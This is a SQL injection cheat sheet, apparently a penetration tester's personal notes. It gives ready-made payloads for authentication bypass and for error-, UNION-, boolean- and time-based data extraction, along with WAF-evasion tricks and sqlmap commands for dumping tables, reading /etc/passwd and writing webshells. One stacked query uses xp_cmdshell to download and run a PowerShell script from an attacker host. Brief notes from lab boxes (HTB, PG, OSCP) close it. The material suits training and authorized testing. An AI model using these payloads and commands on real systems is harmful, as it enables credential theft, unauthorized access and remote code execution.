# SQL Injection

See also: [[Web-Methodology]], [[Authentication-Bypass]]

## Quick Test Payloads

Inject into any user input (login forms, URL params, search fields, headers):

```
'
"
;
')
")
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'-- //
" OR "1"="1"--
admin'--
' OR 1=1-- //
' OR 1=1 LIMIT 1-- //
```

URL-encoded variants:

```
%27
%22
%23
%3B
%27%20OR%20%271%27%3D%271
```

## Detect the DBMS

| Error String | DBMS |
|---|---|
| `You have an error in your SQL syntax` | MySQL / MariaDB |
| `unterminated quoted string` / `syntax error at or near` | PostgreSQL |
| `Unclosed quotation mark` / `Incorrect syntax near` | MSSQL |
| `ORA-00933` / `ORA-01756` | Oracle |

Fingerprint payloads:

| DBMS | Payload |
|---|---|
| MySQL | `conv('a',16,2)=conv('a',16,2)` |
| MSSQL | `@@CONNECTIONS>0` |
| PostgreSQL | `5::int=5` |
| SQLite | `sqlite_version()=sqlite_version()` |

## Authentication Bypass

```
' OR '1'='1'--
' OR 1=1-- //
admin'--
' OR 1=1 LIMIT 1--
```

UNION-based auth bypass (when app hashes passwords):

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', 'NTHASH'--
```

- `NTHASH` = MD5 of `P@ssw0rd`
- Supply `P@ssw0rd` as the login password
- Match column count to what the app expects

PHP magic hash bypass (`0e` hashes): password `240610708` has MD5 starting with `0e`, which PHP `==` treats as zero.

## Error-Based Injection

Extract data through error messages:

```sql
' or 1=1 in (select @@version) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

PostgreSQL error leak:

```sql
LIMIT CAST((SELECT version()) as numeric)
```

MySQL EXTRACTVALUE:

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) --
```

## UNION-Based Injection

### Step 1: Find Column Count

```sql
' ORDER BY 1-- //
' ORDER BY 2-- //
' ORDER BY 3-- //
```

Increment until you get an error. Last successful number = column count.

Alternative:

```sql
' UNION SELECT NULL-- //
' UNION SELECT NULL,NULL-- //
' UNION SELECT NULL,NULL,NULL-- //
```

### Step 2: Find Visible Columns

```sql
' UNION SELECT 1,2,3,4,5-- //
```

Check which numbers appear in the page output.

### Step 3: Extract Data

```sql
-- Version, user, database
' UNION SELECT null, null, database(), user(), @@version -- //

-- Enumerate tables
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //

-- Dump credentials
' UNION SELECT null, username, password, description, null FROM users -- //
```

## Blind Injection

### Boolean-Based

```
http://$IP/page.php?id=1 AND 1=1 -- //    (normal response)
http://$IP/page.php?id=1 AND 1=2 -- //    (different response)
```

Extract data character by character:

```sql
' AND SUBSTRING(@@version,1,1)='5' -- //
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32 -- //
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64 -- //
```

### Time-Based

```sql
' AND SLEEP(3)-- //
' AND IF(1=1, SLEEP(3), 'false') -- //
'; WAITFOR DELAY '00:00:05' --       (MSSQL)
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--   (PostgreSQL)
```

## Stacked Queries

Only works on certain DBMS/driver combos (MSSQL common, MySQL with multi-query):

```sql
'; EXEC xp_cmdshell('whoami') --
'; EXEC xp_cmdshell('powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://$LHOST/shell.ps1'')"') --
```

Enable xp_cmdshell if disabled:

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --
```

## Database-Specific Syntax

| Task | MySQL | MSSQL | PostgreSQL |
|---|---|---|---|
| Comment | `-- ` / `#` | `-- ` | `-- ` |
| Version | `@@version` / `version()` | `@@version` | `version()` |
| Current DB | `database()` | `db_name()` | `current_database()` |
| Current user | `user()` / `current_user()` | `user_name()` / `system_user` | `current_user` |
| List DBs | `SELECT schema_name FROM information_schema.schemata` | `SELECT name FROM master..sysdatabases` | `SELECT datname FROM pg_database` |
| List tables | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` | `SELECT name FROM sysobjects WHERE xtype='U'` | `SELECT tablename FROM pg_tables WHERE schemaname='public'` |
| List columns | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` | `SELECT name FROM syscolumns WHERE id=(OBJECT_ID('X'))` | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` |
| String concat | `CONCAT('a','b')` / `'a' 'b'` | `'a'+'b'` | `'a'\|\|'b'` |
| Substring | `SUBSTRING(str,pos,len)` | `SUBSTRING(str,pos,len)` | `SUBSTRING(str FROM pos FOR len)` |
| Conditional | `IF(cond,true,false)` | `IIF(cond,true,false)` | `CASE WHEN cond THEN true ELSE false END` |
| Time delay | `SLEEP(5)` | `WAITFOR DELAY '00:00:05'` | `pg_sleep(5)` |
| Read file | `LOAD_FILE('/etc/passwd')` | `OPENROWSET(BULK '/etc/passwd',SINGLE_CLOB)` | `pg_read_file('/etc/passwd')` |
| Write file | `INTO OUTFILE '/var/www/shell.php'` | N/A | `COPY ... TO '/tmp/file'` |
| Command exec | N/A (UDF needed) | `xp_cmdshell('cmd')` | `COPY ... FROM PROGRAM 'cmd'` |

## sqlmap Cheatsheet

### Basic Usage

```bash
# GET parameter
sqlmap -u "http://$IP/page.php?id=1" --batch

# POST parameter
sqlmap -u "http://$IP/login.php" --data="username=test&password=test" --batch

# From Burp request file
sqlmap -r request.txt -p REDACTED --batch

# Specify parameter
sqlmap -u "http://$IP/page.php?id=1" -p REDACTED --batch
```

### Increase Detection

```bash
# Higher level (tests cookies, headers, etc.) and risk (heavy queries)
sqlmap -r request.txt --level=5 --risk=3 --batch

# Boolean hint for blind SQLi
sqlmap -r request.txt --string="Wrong identification" --batch
```

### Enumeration

```bash
sqlmap -r request.txt --dbs --batch                              # List databases
sqlmap -r request.txt -D dbname --tables --batch                 # List tables
sqlmap -r request.txt -D dbname -T users --columns --batch       # List columns
sqlmap -r request.txt -D dbname -T users --dump --batch          # Dump table
sqlmap -r request.txt --dump --batch                             # Dump everything
```

### RCE

```bash
# OS shell (writes webshell)
sqlmap -r request.txt --os-shell --web-root "/var/www/html/tmp" --batch

# Read files
sqlmap -r request.txt --file-read="/etc/passwd" --batch

# Write files
sqlmap -r request.txt --file-write="./shell.php" --file-dest="/var/www/html/shell.php" --batch
```

### Authentication & Headers

```bash
# With cookie
sqlmap -u "http://$IP/page.php?id=1" --cookie="PHPSESSID=abc123" --batch

# With custom headers
sqlmap -u "http://$IP/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1" --batch

# Test cookie parameter
sqlmap -u "http://$IP/" --cookie="id=1*" --level=2 --batch
```

### Tamper Scripts

```bash
# Common tamper scripts
sqlmap -u "http://$IP/page.php?id=1" --tamper=space2comment --batch
sqlmap -u "http://$IP/page.php?id=1" --tamper=between --batch
sqlmap -u "http://$IP/page.php?id=1" --tamper=randomcase --batch
sqlmap -u "http://$IP/page.php?id=1" --tamper=charencode --batch

# Chain multiple
sqlmap -u "http://$IP/page.php?id=1" --tamper="space2comment,between,randomcase" --batch
```

### Useful Flags

```bash
--threads=10           # Speed up
--technique=BEUSTQ     # Force techniques (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline)
--prefix="')"          # Custom prefix
--suffix="-- -"        # Custom suffix
--dbms=mysql           # Force DBMS type
--second-url="http://$IP/result.php"  # Second-order SQLi
--forms                # Auto-parse forms
--crawl=2              # Crawl depth
```

## WAF Bypass Tricks

### No Spaces

```sql
/**/                        -- comment as space
%09                         -- tab
%0A                         -- newline
()                          -- parentheses grouping
'/**/OR/**/1=1/**/--        -- inline comments
```

### No Commas

```sql
LIMIT 1 OFFSET 0                          -- instead of LIMIT 0,1
SUBSTR('SQL' FROM 1 FOR 1)                -- instead of SUBSTR('SQL',1,1)
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
```

### No Equals

```sql
SUBSTRING(VERSION(),1,1) LIKE 5
SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 5
SUBSTRING(VERSION(),1,1) IN (5)
```

### Case & Keyword Tricks

```sql
SeLeCt                     -- mixed case
%53%45%4C%45%43%54         -- URL-encoded SELECT
&&  instead of AND
||  instead of OR
```

### Double URL Encoding

```
%2527  = %27 = '
%2522  = %22 = "
```

## Polyglot Payload

Catches multiple injection contexts at once:

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## From Your Boxes

### Pandora (HTB) -- SQLi in internal web app

- SNMP leaked creds for SSH. Internal Pandora FMS had SQLi in `chart_generator.php?session_id=`
- Single quote triggered MySQL syntax error immediately
- Led to session hijack and admin access
- **Lesson**: Always check internal services via port forwarding. SQLi in session parameters is common in PHP apps.

### Monitored (HTB) -- SQLi in Nagios XI POST parameter

- SNMP leaked service account creds. API auth token granted limited access.
- SQLi in `banner_message-ajaxhelper.php` POST `id` parameter
- sqlmap command: `sqlmap -u "https://$IP/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p REDACTED --cookie="nagiosxi=COOKIE" --batch --threads 10 --dbs`
- Dumped admin API key from `xi_users` table, used it to create new admin account via API
- **Lesson**: SQLi in POST params requires Burp intercept + sqlmap `-r` or `--data`. Always dump API keys/tokens, not just passwords.

### Falafel (HTB) -- Time-based blind SQLi in login form

- Username enumeration via different error messages (`try again` vs `Wrong identification`)
- sqlmap with `--level 5 --risk 3 --string "Wrong identification"` found time-based blind SQLi
- Dumped MD5 hashes. Admin hash started with `0e` -- PHP magic hash bypass with `240610708` as password
- **Lesson**: When hashes look like `0e...`, think PHP type juggling. Time-based blind is SLOW -- use `--threads` and `--technique=T`.

### Hawat (PG) -- SQLi in Java source code

- Downloaded source code from cloud portal. Found hardcoded DB creds and raw string concatenation in Java: `"SELECT message FROM issue WHERE priority='"+priority+"'"`
- Injectable via the `priority` parameter on port 50080
- **Lesson**: Always review downloaded source code for SQLi patterns. String concatenation in queries = guaranteed injection point.

### OSCP A MS01 -- SQLi Auth Bypass via Public Exploit

- Attendance and Payroll System v1.0 on port 81
- Public exploit (EDB-50802) performed SQLi auth bypass, extracted PHPSESSID
- Insert cookie into browser to access admin panel without credentials
- **Lesson**: Search ExploitDB for the exact CMS name + version. Auth bypass exploits often extract session cookies via SQLi.
